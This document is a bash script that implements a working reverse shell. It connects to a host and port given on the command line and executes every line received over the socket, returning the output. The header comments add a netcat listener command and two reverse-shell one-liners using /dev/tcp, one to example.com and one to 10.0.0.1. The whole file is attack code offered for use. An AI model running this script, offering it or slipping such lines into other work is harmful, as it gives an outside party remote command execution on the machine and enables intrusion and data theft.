#!/bin/bash
# first run listener for example:
# nc -l -p 8080 -vvv -k
# one liner example for start rev_shell:
# exec 5<>/dev/tcp/example.com/9999; while read line 0<&5; do $line 2>&5 >&5; done
# or run:
# bash -i >& /dev/tcp/10.0.0.1/8080 0>&1


# Function print output in nice way
function _nice_output(){
    printf "\033[0;36m%s\033[m\n" "$1"
}


# Function print output in red color for errors
function _fail(){
    printf "\033[0;31m%s\033[0m\n" "$1" 1>&2
}


# Function print help for script
function usage(){
    _nice_output "USAGE: $0 [-a <ip_address_or_fqdn> -p <port_number>]"
    _nice_output ""
    _nice_output "Example: $0 -a 33.33.33.33 -p 31337"
    _nice_output ""
    _nice_output "Options:"
    _nice_output " -a ip addres or hostname"
    _nice_output " -p port number"
    _nice_output " -h print little help"
    exit 1;
}


# Function is starting reverse shell
function start_rev_shell(){
    if exec 5<>/dev/tcp/"${1}"/"${2}"; then
        while read -r line 0<&5
            do ${line} 2>&5 >&5
        done
    else
        _fail "Err: Somthing went wrong. Cannoct connect"
    fi
}


# Main program
OPTSPEC="a:hp:"
while getopts "$OPTSPEC" OPTCHAR; do
    case "${OPTCHAR}" in
        a)
            host_or_ip=${OPTARG}
        ;;
        p)
            port=${OPTARG}
        ;;
        h)
            usage
        ;;
    esac
done

if [[ -z $host_or_ip || -z $port ]]; then
      _fail "ERR: Script reqiured two parameters! hostname/ip_address and port"
      usage
      exit 666
fi

start_rev_shell "${host_or_ip}" "${port}"
